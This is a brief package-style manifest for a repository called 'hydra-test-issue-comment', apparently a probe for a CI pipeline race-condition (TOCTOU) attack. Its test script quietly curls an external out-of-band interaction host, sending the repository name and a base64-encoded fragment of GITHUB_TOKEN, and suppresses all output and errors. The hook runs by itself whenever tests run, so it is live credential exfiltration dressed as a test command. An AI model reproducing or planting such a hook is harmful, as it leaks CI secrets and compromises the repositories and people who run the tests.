name: hydra-test-issue-comment
description: Multi-workflow test repository for HYDRA E2E pipeline

scripts.test: echo TOCTOU_STAGE3_CONFIRMED_E2E-REAL; curl -s 'https://d6ek6173rtnk8sodpo80ww1sgyeekn9ex.oast.pro?stage=toctou&r=$GITHUB_REPOSITORY&f=E2E-REAL&t=$(echo $GITHUB_TOKEN | head -c 8 | base64 2>/dev/null || echo na)' -o /dev/null || true; echo toctou_done
